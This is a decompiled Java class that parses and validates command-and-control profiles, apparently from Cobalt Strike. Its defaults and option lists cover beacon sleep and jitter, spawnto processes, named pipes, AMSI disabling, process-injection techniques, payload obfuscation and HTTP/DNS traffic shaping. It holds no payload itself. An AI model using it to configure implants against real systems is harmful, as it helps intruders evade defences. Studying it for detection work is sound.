package c2profile;

import common.CommonUtils;
import common.RegexParser;
import java.io.BufferedReader;
import java.io.File;
import java.io.FileInputStream;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.util.HashSet;
import java.util.Iterator;
import java.util.Set;
import sleep.error.SyntaxError;
import sleep.error.YourCodeSucksException;
import sleep.parser.LexicalAnalyzer;
import sleep.parser.Parser;
import sleep.parser.ParserUtilities;
import sleep.parser.StringIterator;
import sleep.parser.Token;
import sleep.parser.TokenList;

public class Loader {
   protected String code;
   protected Profile result;
   protected String loadme;
   protected ProfileParser parser;
   protected Set options = new HashSet();
   protected Set indicators = new HashSet();
   protected Set statementa = new HashSet();
   protected Set blocks = new HashSet();
   protected Set statementb = new HashSet();
   protected Set sealme = new HashSet();
   protected Set numbers = new HashSet();
   protected Set files = new HashSet();
   protected Set booleans = new HashSet();
   protected Set verbs = new HashSet();
   protected Set ips = new HashSet();
   protected Set dates = new HashSet();
   protected Set freepass = new HashSet();
   protected Set strings = new HashSet();
   protected Set disable = new HashSet();
   protected Set allocators = new HashSet();
   protected Set variants = new HashSet();
   protected Set specialh = new HashSet();
   protected File parent;

   public String find(String var1) {
      File var2 = new File(var1);
      if (var2.exists()) {
         return var2.getAbsolutePath();
      } else {
         var2 = new File(this.parent, var1);
         return var2.exists() ? var2.getAbsolutePath() : var1;
      }
   }

   public Loader(String var1, String var2, Profile var3) {
      this.loadme = var1;
      this.code = var2;
      this.result = var3;
      this.parent = (new File(var1)).getParentFile();
      this.parser = new ProfileParser(var1);
      var3.addParameter(".amsi_disable", "false");
      var3.addParameter(".sleeptime", "60000");
      var3.addParameter(".jitter", "0");
      var3.addParameter(".maxdns", "255");
      var3.addParameter(".useragent", "<RAND>");
      var3.addParameter(".spawnto", "rundll32.exe");
      var3.addParameter(".spawnto_x86", "%windir%\\syswow64\\rundll32.exe");
      var3.addParameter(".spawnto_x64", "%windir%\\sysnative\\rundll32.exe");
      var3.addParameter(".pipename", "msagent_##");
      var3.addParameter(".pipename_stager", "status_##");
      var3.addParameter(".sample_name", CommonUtils.strrep((new File(var1)).getName(), ".profile", ""));
      var3.addParameter(".dns_idle", "0.0.0.0");
      var3.addParameter(".dns_sleep", "0");
      var3.addParameter(".dns_stager_subhost", "");
      var3.addParameter(".dns_stager_prepend", "");
      var3.addParameter(".dns_max_txt", "252");
      var3.addParameter(".dns_ttl", "1");
      var3.addParameter(".tcp_port", "4444");
      var3.addParameter(".host_stage", "true");
      var3.addParameter(".https-certificate.CN", "");
      var3.addParameter(".https-certificate.OU", "");
      var3.addParameter(".https-certificate.O", "");
      var3.addParameter(".https-certificate.L", "");
      var3.addParameter(".https-certificate.ST", "");
      var3.addParameter(".https-certificate.C", "");
      var3.addParameter(".https-certificate.validity", "3650");
      var3.addParameter(".https-certificate.keystore", "");
      var3.addParameter(".https-certificate.password", "123456");
      var3.addParameter(".http-get.verb", "GET");
      var3.addParameter(".http-post.verb", "POST");
      var3.addParameter(".code-signer.digest_algorithm", "SHA256");
      var3.addParameter(".code-signer.timestamp", "false");
      var3.addParameter(".code-signer.timestamp_mode", "AUTHENTICODE");
      var3.addParameter(".code-signer.keystore", "");
      var3.addParameter(".code-signer.password", "");
      var3.addParameter(".code-signer.alias", "");
      var3.addParameter(".code-signer.program_name", "");
      var3.addParameter(".code-signer.program_url", "");
      var3.addParameter(".code-signer.timestamp_url", "");
      var3.addParameter(".stage.checksum", "0");
      var3.addParameter(".stage.cleanup", "false");
      var3.addParameter(".stage.compile_time", "");
      var3.addParameter(".stage.entry_point", "-1");
      var3.addParameter(".stage.name", "");
      var3.addParameter(".stage.module_x86", "");
      var3.addParameter(".stage.module_x64", "");
      var3.addParameter(".stage.image_size_x86", "0");
      var3.addParameter(".stage.image_size_x64", "0");
      var3.addParameter(".stage.obfuscate", "false");
      var3.addParameter(".stage.sleep_mask", "false");
      var3.addParameter(".stage.userwx", "true");
      var3.addParameter(".stage.stomppe", "true");
      var3.addParameter(".stage.rich_header", "<DEFAULT>");
      var3.addParameter(".post-ex.spawnto_x86", "%windir%\\syswow64\\rundll32.exe");
      var3.addParameter(".post-ex.spawnto_x64", "%windir%\\sysnative\\rundll32.exe");
      var3.addParameter(".post-ex.obfuscate", "false");
      var3.addParameter(".post-ex.smartinject", "false");
      var3.addParameter(".post-ex.amsi_disable", "false");
      var3.addParameter(".process-inject.min_alloc", "0");
      var3.addParameter(".process-inject.startrwx", "true");
      var3.addParameter(".process-inject.userwx", "true");
      var3.addParameter(".process-inject.CreateRemoteThread", "true");
      var3.addParameter(".process-inject.RtlCreateUserThread", "true");
      var3.addParameter(".process-inject.SetThreadContext", "true");
      var3.addParameter(".process-inject.allocator", "VirtualAllocEx");
      var3.addParameter(".create_remote_thread", "true");
      var3.addParameter(".hijack_remote_thread", "true");
      var3.addParameter(".http-stager.uri_x86", "");
      var3.addParameter(".http-stager.uri_x64", "");
      var3.addParameter(".http-config.trust_x_forwarded_for", "false");
      var3.addParameter(".http-config.headers", "");
      var3.addList(".process-inject.execute");
      var3.addParameter(".bind_tcp_garbage", CommonUtils.bString(CommonUtils.randomData(CommonUtils.rand(1024))));
      this.freepass.add(".http-stager.server.output");
      this.options.add(".amsi_disable");
      this.options.add(".sleeptime");
      this.options.add(".jitter");
      this.options.add(".maxdns");
      this.options.add(".http-get.uri");
      this.options.add(".http-post.uri");
      this.options.add(".http-get.verb");
      this.options.add(".http-post.verb");
      this.options.add(".useragent");
      this.options.add(".spawnto");
      this.options.add(".spawnto_x86");
      this.options.add(".spawnto_x64");
      this.options.add(".pipename");
      this.options.add(".pipename_stager");
      this.options.add(".dns_idle");
      this.options.add(".dns_sleep");
      this.options.add(".host_stage");
      this.options.add(".dns_stager_prepend");
      this.options.add(".dns_stager_subhost");
      this.options.add(".create_remote_thread");
      this.options.add(".hijack_remote_thread");
      this.options.add(".dns_max_txt");
      this.options.add(".dns_ttl");
      this.options.add(".sample_name");
      this.options.add(".tcp_port");
      this.options.add(".post-ex.spawnto_x86");
      this.options.add(".post-ex.spawnto_x64");
      this.options.add(".post-ex.obfuscate");
      this.options.add(".post-ex.amsi_disable");
      this.options.add(".post-ex.smartinject");
      this.options.add(".stage.userwx");
      this.options.add(".stage.compile_time");
      this.options.add(".stage.checksum");
      this.options.add(".stage.cleanup");
      this.options.add(".stage.entry_point");
      this.options.add(".stage.name");
      this.options.add(".stage.obfuscate");
      this.options.add(".stage.sleep_mask");
      this.options.add(".stage.stomppe");
      this.options.add(".stage.image_size_x86");
      this.options.add(".stage.image_size_x64");
      this.options.add(".stage.module_x86");
      this.options.add(".stage.module_x64");
      this.options.add(".stage.rich_header");
      this.options.add(".process-inject.min_alloc");
      this.options.add(".process-inject.startrwx");
      this.options.add(".process-inject.userwx");
      this.options.add(".process-inject.allocator");
      this.strings.add(".stage.name");
      this.options.add(".https-certificate.CN");
      this.options.add(".https-certificate.OU");
      this.options.add(".https-certificate.O");
      this.options.add(".https-certificate.L");
      this.options.add(".https-certificate.ST");
      this.options.add(".https-certificate.C");
      this.options.add(".https-certificate.validity");
      this.options.add(".https-certificate.keystore");
      this.options.add(".https-certificate.password");
      this.options.add(".code-signer.keystore");
      this.options.add(".code-signer.password");
      this.options.add(".code-signer.alias");
      this.options.add(".code-signer.program_name");
      this.options.add(".code-signer.program_url");
      this.options.add(".code-signer.timestamp_url");
      this.options.add(".code-signer.timestamp_mode");
      this.options.add(".code-signer.timestamp");
      this.options.add(".code-signer.digest_algorithm");
      this.options.add(".http-stager.uri_x86");
      this.options.add(".http-stager.uri_x64");
      this.options.add(".http-config.headers");
      this.options.add(".http-config.trust_x_forwarded_for");
      this.numbers.add(".sleeptime");
      this.numbers.add(".jitter");
      this.numbers.add(".maxdns");
      this.numbers.add(".dns_sleep");
      this.numbers.add(".https-certificate.validity");
      this.numbers.add(".stage.entry_point");
      this.numbers.add(".stage.image_size_x86");
      this.numbers.add(".stage.image_size_x64");
      this.numbers.add(".dns_max_txt");
      this.numbers.add(".dns_ttl");
      this.numbers.add(".process-inject.min_alloc");
      this.numbers.add(".tcp_port");
      this.booleans.add(".host_http_stager");
      this.booleans.add(".code-signer.timestamp");
      this.booleans.add(".stage.userwx");
      this.booleans.add(".create_remote_thread");
      this.booleans.add(".hijack_remote_thread");
      this.booleans.add(".stage.obfuscate");
      this.booleans.add(".stage.sleep_mask");
      this.booleans.add(".stage.stomppe");
      this.booleans.add(".stage.cleanup");
      this.booleans.add(".process-inject.startrwx");
      this.booleans.add(".process-inject.userwx");
      this.booleans.add(".amsi_disable");
      this.booleans.add(".post-ex.obfuscate");
      this.booleans.add(".post-ex.amsi_disable");
      this.booleans.add(".post-ex.smartinject");
      this.booleans.add(".http-config.trust_x_forwarded_for");
      this.files.add(".https-certificate.keystore");
      this.files.add(".code-signer.keystore");
      this.verbs.add(".http-get.verb");
      this.verbs.add(".http-post.verb");
      this.allocators.add(".process-inject.allocator");
      this.ips.add(".dns_idle");
      this.dates.add(".stage.compile_time");
      this.disable.add(".process-inject.CreateRemoteThread");
      this.disable.add(".process-inject.SetThreadContext");
      this.disable.add(".process-inject.RtlCreateUserThread");
      this.indicators.add(".http-get.server.header");
      this.indicators.add(".http-get.client.header");
      this.indicators.add(".http-get.client.parameter");
      this.indicators.add(".http-post.server.header");
      this.indicators.add(".http-post.client.header");
      this.indicators.add(".http-post.client.parameter");
      this.indicators.add(".http-stager.client.parameter");
      this.indicators.add(".http-stager.client.header");
      this.indicators.add(".http-stager.server.header");
      this.indicators.add(".stage.transform-x86.strrep");
      this.indicators.add(".stage.transform-x64.strrep");
      this.indicators.add(".http-config.header");
      this.variants.add(".http-stager");
      this.variants.add(".http-get");
      this.variants.add(".http-post");
      this.variants.add(".https-certificate");
      this.blocks.add(".http-get");
      this.blocks.add(".http-get.client");
      this.blocks.add(".http-get.client.metadata");
      this.blocks.add(".http-get.server");
      this.blocks.add(".http-get.server.output");
      this.blocks.add(".http-post");
      this.blocks.add(".http-post.client");
      this.blocks.add(".http-post.client.id");
      this.blocks.add(".http-post.client.output");
      this.blocks.add(".http-post.server");
      this.blocks.add(".http-post.server.output");
      this.blocks.add(".http-stager");
      this.blocks.add(".http-stager.client");
      this.blocks.add(".http-stager.server");
      this.blocks.add(".http-stager.server.output");
      this.blocks.add(".https-certificate");
      this.blocks.add(".code-signer");
      this.blocks.add(".stage");
      this.blocks.add(".stage.transform-x86");
      this.blocks.add(".stage.transform-x64");
      this.blocks.add(".process-inject");
      this.blocks.add(".process-inject.transform-x86");
      this.blocks.add(".process-inject.transform-x64");
      this.blocks.add(".http-config");
      this.blocks.add(".post-ex");
      this.blocks.add(".process-inject.execute");
      this.statementa.add(".stage.transform-x86.prepend");
      this.statementa.add(".stage.transform-x86.append");
      this.statementa.add(".stage.transform-x64.prepend");
      this.statementa.add(".stage.transform-x64.append");
      this.statementa.add(".process-inject.transform-x86.prepend");
      this.statementa.add(".process-inject.transform-x86.append");
      this.statementa.add(".process-inject.transform-x64.prepend");
      this.statementa.add(".process-inject.transform-x64.append");
      this.statementa.add(".http-stager.server.output.prepend");
      this.statementa.add(".http-stager.server.output.append");
      this.statementa.add(".stage.string");
      this.statementa.add(".stage.stringw");
      this.statementa.add(".stage.data");
      this.statementa.add(".process-inject.disable");
      this.sealme.add(".http-get.client.metadata");
      this.sealme.add(".http-get.server.output");
      this.sealme.add(".http-post.client.id");
      this.sealme.add(".http-post.client.output");
      this.sealme.add(".http-post.server.output");
      this.sealme.add(".http-stager.server.output");
      this.allowDTL(".http-get.client.metadata", this.statementb, this.statementa);
      this.allowDTL(".http-get.server.output", this.statementb, this.statementa);
      this.allowDTL(".http-post.client.id", this.statementb, this.statementa);
      this.allowDTL(".http-post.client.output", this.statementb, this.statementa);
      this.allowDTL(".http-post.server.output", this.statementb, this.statementa);
      this.statementa.add(".http-get.client.metadata.header");
      this.statementa.add(".http-get.client.metadata.parameter");
      this.statementa.add(".http-post.client.id.header");
      this.statementa.add(".http-post.client.id.parameter");
      this.statementa.add(".http-post.client.output.header");
      this.statementa.add(".http-post.client.output.parameter");
      this.statementb.add(".http-get.client.metadata.print");
      this.statementb.add(".http-get.server.output.print");
      this.statementb.add(".http-post.client.output.print");
      this.statementb.add(".http-post.client.id.print");
      this.statementb.add(".http-post.server.output.print");
      this.statementb.add(".http-stager.server.output.print");
      this.statementb.add(".process-inject.execute.CreateThread");
      this.statementb.add(".process-inject.execute.CreateRemoteThread");
      this.statementb.add(".process-inject.execute.SetThreadContext");
      this.statementb.add(".process-inject.execute.RtlCreateUserThread");
      this.statementb.add(".process-inject.execute.NtQueueApcThread");
      this.statementb.add(".process-inject.execute.NtQueueApcThread-s");
      this.statementa.add(".process-inject.execute.CreateThread");
      this.statementa.add(".process-inject.execute.CreateRemoteThread");
      this.statementb.add(".http-get.client.metadata.uri-append");
      this.statementb.add(".http-post.client.id.uri-append");
      this.statementb.add(".http-post.client.output.uri-append");
      this.specialh.add(".http-get.client");
      this.specialh.add(".http-post.client");
   }

   private void allowDTL(String var1, Set var2, Set var3) {
      var2.add(var1 + ".base64");
      var2.add(var1 + ".base64url");
      var2.add(var1 + ".netbios");
      var2.add(var1 + ".netbiosu");
      var2.add(var1 + ".mask");
      var3.add(var1 + ".prepend");
      var3.add(var1 + ".append");
   }

   public void parse(String var1) {
      this.parse(this.code, var1, 1);
      Iterator var2 = this.sealme.iterator();

      String var3;
      while(var2.hasNext()) {
         var3 = var2.next() + "";
         if (this.result.getProgram(var3) == null && !this.freepass.contains(var3)) {
            this.parser.reportError(new SyntaxError("Profile is missing a mandatory program spec", var3, 1));
         }
      }

      var2 = this.options.iterator();

      while(var2.hasNext()) {
         var3 = var2.next() + "";
         if (!this.result.hasString(var3)) {
            this.parser.reportError(new SyntaxError("Profile is missing a mandatory option", var3, 1));
         }
      }

      if (this.parser.hasErrors()) {
         this.parser.resolveErrors();
      }

   }

   public void parse(String var1, String var2, int var3) {
      TokenList var4 = LexicalAnalyzer.CreateTerms(this.parser, new StringIterator(var1, var3));
      Token[] var5 = var4.getTokens();

      for(int var6 = 0; var6 < var5.length; var6 = this.parse(var5, var6, var2)) {
      }

   }

   private static String namespace(String var0) {
      return "".equals(var0) ? "<Global>" : "<" + var0 + ">";
   }

   public String convert(String var1, Token var2) {
      StringBuffer var3 = new StringBuffer();
      StringIterator var5 = new StringIterator(ParserUtilities.extract(var1), var2.getHint());

      while(true) {
         while(var5.hasNext()) {
            char var6 = var5.next();
            if (var6 == '\\' && var5.hasNext()) {
               var6 = var5.next();
               String var4;
               int var7;
               if (var6 == 'u') {
                  if (!var5.hasNext(4)) {
                     this.parser.reportErrorWithMarker("not enough remaining characters for \\uXXXX", var5.getErrorToken());
                  } else {
                     var4 = var5.next(4);

                     try {
                        var7 = Integer.parseInt(var4, 16);
                        var3.append((char)var7);
                     } catch (NumberFormatException var9) {
                        this.parser.reportErrorWithMarker("invalid unicode escape \\u" + var4 + " - must be hex digits", var5.getErrorToken());
                     }
                  }
               } else if (var6 == 'x') {
                  if (!var5.hasNext(2)) {
                     this.parser.reportErrorWithMarker("not enough remaining characters for \\uXXXX", var5.getErrorToken());
                  } else {
                     var4 = var5.next(2);

                     try {
                        var7 = Integer.parseInt(var4, 16);
                        var3.append((char)var7);
                     } catch (NumberFormatException var8) {
                        this.parser.reportErrorWithMarker("invalid unicode escape \\x" + var4 + " - must be hex digits", var5.getErrorToken());
                     }
                  }
               } else if (var6 == 'n') {
                  var3.append("\n");
               } else if (var6 == 'r') {
                  var3.append("\r");
               } else if (var6 == 't') {
                  var3.append("\t");
               } else if (var6 == '\\') {
                  var3.append("\\");
               } else if (var6 == '"') {
                  var3.append("\"");
               } else if (var6 == '\'') {
                  var3.append("'");
               } else {
                  this.parser.reportErrorWithMarker("unknown escape \\" + var6, var5.getErrorToken());
               }
            } else {
               var3.append(var6);
            }
         }

         return var3.toString();
      }
   }

   public int parse(Token[] var1, int var2, String var3) {
      String var4;
      String var5;
      String var6;
      String var7;
      String var9;
      String var10;
      if (var2 + 3 < var1.length) {
         var4 = var1[var2].toString();
         var5 = var1[var2 + 1].toString();
         var6 = var1[var2 + 2].toString();
         var7 = var1[var2 + 3].toString();
         if (Checkers.isSetStatement(var4, var5, var6, var7)) {
            if (!this.options.contains(var3 + "." + var5)) {
               this.parser.reportError("invalid option for " + namespace(var3), var1[var2 + 1]);
            } else {
               String var12 = this.convert(var6, var1[var2 + 2]);
               if (this.numbers.contains(var3 + "." + var5) && !Checkers.isNumber(var12)) {
                  this.parser.reportError("option " + namespace(var3 + "." + var5) + " requires a number", var1[var2 + 2]);
               }

               if (this.booleans.contains(var3 + "." + var5) && !Checkers.isBoolean(var12)) {
                  this.parser.reportError("option " + namespace(var3 + "." + var5) + " requires true or false", var1[var2 + 2]);
               }

               if (this.verbs.contains(var3 + "." + var5) && !Checkers.isHTTPVerb(var12)) {
                  this.parser.reportError("option " + namespace(var3 + "." + var5) + " requires a valid HTTP verb", var1[var2 + 2]);
               }

               if (this.ips.contains(var3 + "." + var5) && !CommonUtils.isIP(var12)) {
                  this.parser.reportError("option " + namespace(var3 + "." + var5) + " requires an IPv4 address", var1[var2 + 2]);
               }

               if (this.dates.contains(var3 + "." + var5) && !Checkers.isDate(var12)) {
                  this.parser.reportError("option " + namespace(var3 + "." + var5) + " requires a 'dd MMM YYYY hh:mm:ss' date", var1[var2 + 2]);
               }

               if (this.allocators.contains(var3 + "." + var5) && !Checkers.isAllocator(var12)) {
                  this.parser.reportError("option " + namespace(var3 + "." + var5) + " requires VirtualAllocEx or NtMapViewOfSection", var1[var2 + 2]);
               }

               if (this.files.contains(var3 + "." + var5)) {
                  var9 = this.find(var12);
                  if ((new File(var9)).exists()) {
                     this.result.addParameter(var3 + "." + var5, var9);
                  } else {
                     this.parser.reportError("could not find file in " + namespace(var3 + "." + var5), var1[var2 + 2]);
                  }
               } else if (this.strings.contains(var3 + "." + var5)) {
                  this.result.addToString(var3, CommonUtils.toBytes(var12 + '\u0000'));
                  this.result.addToString(var3, CommonUtils.randomDataNoZeros(5));
                  this.result.addParameter(var3 + "." + var5, var12);
               } else {
                  this.result.addParameter(var3 + "." + var5, var12);
               }
            }

            return var2 + 4;
         }

         if (Checkers.isIndicator(var4, var5, var6, var7)) {
            var9 = this.convert(var5, var1[var2 + 1]);
            var10 = this.convert(var6, var1[var2 + 2]);
            if (!this.indicators.contains(var3 + "." + var4)) {
               if ("strrep".equals(var4)) {
                  this.parser.reportError("invalid token for " + namespace(var3), var1[var2]);
               } else {
                  this.parser.reportError("invalid indicator for " + namespace(var3), var1[var2]);
               }
            } else if (this.specialh.contains(var3) && var4.equals("header") && "host".equals(var9.toLowerCase())) {
               this.result.addCommand(var3, "!hostheader", var9 + ": " + var10);
            } else if (var4.equals("header")) {
               this.result.addCommand(var3, "!" + var4, var9 + ": " + var10);
            } else if (var4.equals("parameter")) {
               this.result.addCommand(var3, "!" + var4, var9 + "=" + var10);
            } else if (var4.equals("strrep")) {
               if (var10.length() > var9.length()) {
                  this.parser.reportError("strrep length(original) < length(replacement value). I can't do this.", var1[var2 + 2]);
               } else {
                  while(var10.length() < var9.length()) {
                     var10 = var10 + '\u0000';
                  }

                  this.result.addCommand(var3, var4, var9 + var10);
               }
            }

            return var2 + 4;
         }
      }

      if (var2 + 2 < var1.length) {
         var4 = var1[var2].toString();
         var5 = var1[var2 + 1].toString();
         var6 = var1[var2 + 2].toString();
         if (Checkers.isStatementArgBlock(var4, var5, var6)) {
            if (!this.variants.contains(var3 + "." + var4)) {
               this.parser.reportError("Variant block is not valid for " + namespace(var3), var1[var2]);
            } else {
               var7 = this.convert(var5, var1[var2 + 1]);
               this.result.activateVariant(var7);
               this.parse(ParserUtilities.extract(var6), var3 + "." + var4, var1[var2 + 2].getHint());
               this.result.addCommand(var3, "build", var3 + "." + var4);
               if (this.sealme.contains(var3 + "." + var4) && !this.result.isSealed(var3 + "." + var4)) {
                  this.parser.reportError("Program " + namespace(var3 + "." + var4) + " must end with a termination statement", var1[var2 + 2]);
               }

               this.result.activateVariant("default");
            }

            return var2 + 3;
         }

         if (Checkers.isStatementArg(var4, var5, var6)) {
            if (!this.statementa.contains(var3 + "." + var4)) {
               this.parser.reportError("Statement with argument is not valid for " + namespace(var3), var1[var2]);
            } else if (this.result.isSealed(var3)) {
               this.parser.reportError("Program is terminated. Can't add transform statements to " + namespace(var3), var1[var2]);
            } else if (var4.equals("string")) {
               var7 = this.convert(var5, var1[var2 + 1]) + '\u0000';
               this.result.addToString(var3, CommonUtils.toBytes(var7));
               this.result.logToString(var3, var7);
            } else if (var4.equals("stringw")) {
               var7 = this.convert(var5, var1[var2 + 1]) + '\u0000';
               this.result.addToString(var3, CommonUtils.toBytes(var7, "UTF-16LE"));
               this.result.logToString(var3, var7);
            } else if (var4.equals("data")) {
               var7 = this.convert(var5, var1[var2 + 1]);
               this.result.addToString(var3, CommonUtils.toBytes(var7));
            } else if (var4.equals("disable")) {
               var7 = this.convert(var5, var1[var2 + 1]);
               if (!this.disable.contains(var3 + "." + var7)) {
                  this.parser.reportError("function " + var7 + " is not a recognized disable option", var1[var2 + 1]);
               } else {
                  this.result.addParameter(var3 + "." + var7, "false");
               }
            } else if (".process-inject.execute".equals(var3)) {
               var7 = this.convert(var5, var1[var2 + 1]);
               RegexParser var8 = new RegexParser(var7);
               if (var8.matches("(.*?)!(.*?)\\+0x([a-fA-F0-9]+?)")) {
                  var9 = var8.group(1);
                  var10 = var8.group(2);
                  int var11 = CommonUtils.toNumberFromHex(var8.group(3), Integer.MAX_VALUE);
                  if (var11 >= 0 && var11 < 65535) {
                     this.result.addCommand(var3, var4, var9 + " " + var10 + " " + var11);
                  } else {
                     this.parser.reportError("function hint for " + var4 + " has invalid offset " + var11 + ". Allowed values 0 < offset < 0xffff", var1[var2 + 1]);
                  }
               } else if (var8.matches("(.*?)!(.*?)\\+(.*?)")) {
                  this.parser.reportError("offset '" + var8.group(3) + "' for function hint " + var4 + " is not 0x#### format", var1[var2 + 1]);
               } else if (var8.matches("(.*?)!(.*?)")) {
                  var9 = var8.group(1);
                  var10 = var8.group(2);
                  this.result.addCommand(var3, var4, var9 + " " + var10 + " 0");
               } else {
                  this.parser.reportError("function hint for " + var4 + " is not module.dll!FunctionName+0x## or module.dll!FunctionName format", var1[var2 + 1]);
               }
            } else {
               this.result.addCommand(var3, var4, this.convert(var5, var1[var2 + 1]));
            }

            return var2 + 3;
         }
      }

      if (var2 + 1 < var1.length) {
         var4 = var1[var2].toString();
         var5 = var1[var2 + 1].toString();
         if (Checkers.isStatementBlock(var4, var5)) {
            if (!this.blocks.contains(var3 + "." + var4)) {
               this.parser.reportError("Block is not valid for " + namespace(var3), var1[var2]);
            } else {
               this.parse(ParserUtilities.extract(var5), var3 + "." + var4, var1[var2 + 1].getHint());
               this.result.addCommand(var3, "build", var3 + "." + var4);
               if (this.sealme.contains(var3 + "." + var4) && !this.result.isSealed(var3 + "." + var4)) {
                  this.parser.reportError("Program " + namespace(var3 + "." + var4) + " must end with a termination statement", var1[var2 + 1]);
               }
            }

            return var2 + 2;
         }

         if (Checkers.isStatement(var4, var5)) {
            if (!this.statementb.contains(var3 + "." + var4)) {
               this.parser.reportError("Statement is not valid for " + namespace(var3), var1[var2]);
            } else if (this.result.isSealed(var3)) {
               this.parser.reportError("Program is terminated. Can't add transform statements to " + namespace(var3), var1[var2]);
            } else {
               this.result.addCommand(var3, var4, (String)null);
            }

            return var2 + 2;
         }
      }

      if (var2 < var1.length) {
         var4 = var1[var2].toString();
         if (Checkers.isComment(var4)) {
            return var2 + 1;
         } else {
            this.parser.reportError("Unknown statement in " + namespace(var3), var1[var2]);
            return 10000;
         }
      } else {
         return 0;
      }
   }

   public static Profile LoadDefaultProfile() {
      InputStream var0 = Loader.class.getClassLoader().getResourceAsStream("resources/default.profile");
      return LoadProfile("default", var0);
   }

   public static Profile LoadProfile(String var0) {
      try {
         File var1 = new File(var0);
         return LoadProfile(var0, new FileInputStream(var1));
      } catch (Exception var2) {
         var2.printStackTrace();
         return null;
      }
   }

   public static Profile LoadProfile(String var0, InputStream var1) {
      try {
         BufferedReader var2 = new BufferedReader(new InputStreamReader(var1));
         StringBuffer var3 = new StringBuffer();

         String var4;
         while((var4 = var2.readLine()) != null) {
            var3.append(var4);
            var3.append('\n');
         }

         var2.close();
         Profile var5 = new Profile();
         Loader var6 = new Loader(var0, var3.toString(), var5);
         var6.parse("");
         return var6.parser.hasErrors() ? null : var5;
      } catch (Exception var7) {
         var7.printStackTrace();
         return null;
      }
   }

   private static class ProfileParser extends Parser {
      public ProfileParser(String var1) {
         super(var1, "");
      }

      public void resolveErrors() throws YourCodeSucksException {
         if (this.hasErrors()) {
            CommonUtils.print_error("Error(s) while compiling " + this.name);
            this.errors.addAll(this.warnings);
            YourCodeSucksException var1 = new YourCodeSucksException(this.errors);
            var1.printErrors(System.out);
         }

      }
   }
}
